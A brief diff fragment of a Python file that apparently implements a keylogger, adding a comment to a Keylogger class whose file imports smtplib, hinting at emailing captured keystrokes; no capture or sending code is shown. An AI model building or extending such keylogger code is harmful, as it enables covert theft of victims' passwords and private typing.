@@ -3,6 +3,8 @@ import time
 import threading
 import smtplib
 
+# Class that keylogs the keyboard of the user
+
 class Keylogger:
     def __init__(self):
         self.log = ""
